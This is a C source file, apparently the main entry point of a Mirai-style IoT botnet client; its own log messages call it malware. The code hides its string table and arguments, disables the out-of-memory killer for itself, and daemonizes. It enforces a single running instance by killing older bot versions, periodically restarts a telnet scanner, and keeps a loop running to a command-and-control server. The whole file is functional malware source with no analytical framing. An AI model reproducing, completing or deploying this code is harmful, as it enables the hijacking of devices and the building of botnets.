#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

#include "bot/client/client.h"
#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/utils/bytebuf.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

#include "bot/modules/dynamic.h"
#include "bot/modules/locker.h"

#ifdef KILLER
#include "bot/modules/killer.h"
#include "bot/modules/locker.h"
#endif

#ifdef TELNET_SCANNER
#include "bot/modules/scanner/telnet_scanner.h"
#endif

mac_parse_t MAC_ADDR;
int c2s_pipe[2];
int esi_fd;

bool esi();

#ifdef DEBUG
void segfault_handler(int signo, siginfo_t *info, void *context) {
  printf("Process %d caught SIGSEGV at address %p\n", getpid(), info->si_addr);
  _exit(1);
}

void setup_segv_handler() {
  struct sigaction sa;
  sa.sa_sigaction = segfault_handler;
  sa.sa_flags = SA_SIGINFO;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGSEGV, &sa, NULL) == -1) {
    perror("sigaction");
    exit(EXIT_FAILURE);
  }
}
#endif

void oom_disable() {
  int fd = open(table_retrieve(TABLE_OOM_SCORE_ADJ, NULL), O_WRONLY);
  table_lock(TABLE_OOM_SCORE_ADJ);

  if (fd == -1) return;

  if (write(fd, table_retrieve(TABLE_OOM_SCORE, NULL), 5) != 5) {
    table_lock(TABLE_OOM_SCORE);
    close(fd);
    return;
  }

  table_lock(TABLE_OOM_SCORE);
  close(fd);
}

int main(int argc, char *args[]) {
  if (argc < 1) {
    return 0;
  }

  // yip yap yop
  char name[33];

#ifndef DEBUG
  bool do_daemonize = argc <= 2 || args[2][0] != 'r';
#else
  bool do_daemonize = false;
#endif

  // init the random, table and anti dbg kek
  table_init();
  random_init();
  // antidebug_init();
  oom_disable();

  // write exec msg
  const char *data = table_retrieve(TABLE_EXEC_MESSAGE, NULL);
  write(1, data, strlen(data));
  write(1, "\r\n", 2);
  table_lock(TABLE_EXEC_MESSAGE);

  // copy name
  if (argc > 1 && strlen(args[0]) > 0) {
    strncpy(name, args[1], 32);
    name[strlen(name)] = '\0';
  }

// null out arguments
#ifndef ANDROID
  for (int i = 0; i < argc; i++) {
    memset(args[i], '\0', strlen(args[i]));
  }
#endif

  // prevents zombie procs and then initializes the dynamic thing
  signal(SIGCHLD, SIG_IGN);

#ifndef ANDROID
  dynamic_init(args);
#endif

  if (do_daemonize) {
    if (fork() > 0) return 0;
    setsid();
    close(0);
    close(1);
    close(2);
  }

  // retrieve network mac address
  network_retrieve_mac(&MAC_ADDR);

  // bind single instance
  if (!esi()) {
    LOG_ERROR("esi failed! not executing.");
    return 0;
  }

  // initialize pipe for killer logs etc
  if (pipe(c2s_pipe) == 0) {
    LOG_INFO("Initialized pipe");
  }

  locker_init();


#ifdef TELNET_SCANNER
  scanner_init();
  time_t scanner_started = time(NULL);
#endif

  // initialize the flippin client
  client_t client;
  client.fd = -1;

  // copy name into client name
  memset(client.name, '\0', sizeof(client.name));
  strcpy(client.name, name);

  while (true) {
    // restart every 15 minutes
#ifdef TELNET_SCANNER
    if (time(NULL) - scanner_started > 900) {
      scanner_kill();
      scanner_init();
      scanner_started = time(NULL);
    }
#endif

    if (client.fd == -1) {
      client_connect(&client);
    }

    // clang-format off
    // CLANG PLEASE I BEG
    struct pollfd fd[3] = {
      [0] = {
        .fd = client.fd,
        .events = !client.state ? POLLOUT : POLLIN,
      },
      [1] = {
        .fd = c2s_pipe[0],
        .events = POLLIN,
      },
      [2] = {
        .fd = esi_fd,
        .events = POLLIN,
      },
    };
    // clang-format on

    int ret = poll(fd, 3, 1000);
    if (ret == -1) {
      PRINTF("Connection timed out");
      client_close(&client);
      continue;
    }

    if (fd[2].revents & POLLIN) {
      local_esi_packet_t pkt = {0};

      size_t n = recvfrom(esi_fd, &pkt, sizeof(local_esi_packet_t), MSG_NOSIGNAL, NULL, NULL);
      if (n != sizeof(local_esi_packet_t) || pkt.local_addr != network_local_addr()) {
        LOG_WARN("Invalid replacement packet");
        continue;
      }

      LOG_INFO("Received valid request to commit unalive, new bot version is %d.%d.%d", pkt.major,
               pkt.minor, pkt.patch);

#ifdef KILLER
      locker_kill();
      killer_kill();
#endif

      exit(0);
    }

    // handle pipe things
    if (client.state == CLIENT_STATE_CONNECTED && fd[1].revents & POLLIN) {
      pipe_header_t hdr = {0};
      char buffer[1024] = {0};

      ssize_t n = read(fd[1].fd, &hdr, sizeof(pipe_header_t));
      if (n <= 0) continue;

      // read relayed data
      if (hdr.length > 0) {
        n = read(fd[1].fd, buffer, sizeof(buffer));
        if (n <= 0) continue;
      }

      LOG_TRACE("Writing piped message (command=%d, length=%d)", hdr.command, hdr.length);

      pbytebuf_t buf = bytebuf_new_write();
      bytebuf_write(buf, (uint8_t *)buffer, n);
      client_write(&client, hdr.command, buf);
      bytebuf_free(buf, NULL);

      continue;
    }

    client_events(&client, fd[0]);
  }

  return 0;
}

bool esi() {
  struct sockaddr_un addr;

  // reset address, make sun path
  memset(&addr, '\0', sizeof(addr));
  addr.sun_family = AF_UNIX;
  network_mac_alpha16(MAC_ADDR.high, MAC_ADDR.low, &addr.sun_path[1]);

  int tries = 0;
  while (tries <= 10) {
    if (esi_fd != -1) close(esi_fd);

    // yeah so we failed to bind, bail..
    if ((esi_fd = socket(AF_UNIX, SOCK_DGRAM, 0)) == -1) {
      return false;
    }

    // try to bind to the control space
    if (bind(esi_fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_un)) != -1) {
      LOG_INFO("We are the only malware process [ns->'%s']", &addr.sun_path[1]);
      return true;
    }

    LOG_WARN("We are not the only malware process, sending request ['%s']", &addr.sun_path[1]);

    local_esi_packet_t pkt = {
        .major = 1,
        .minor = 0,
        .patch = 0,
        .local_addr = network_local_addr(),
    };

    sendto(esi_fd, &pkt, sizeof(pkt), MSG_NOSIGNAL, (struct sockaddr *)&addr,
           sizeof(struct sockaddr_un));

    sleep(tries + 1);
    network_kill_unix_inode(&addr.sun_path[1], strlen(&addr.sun_path[1]));

    ++tries;
  }

  return false;
}
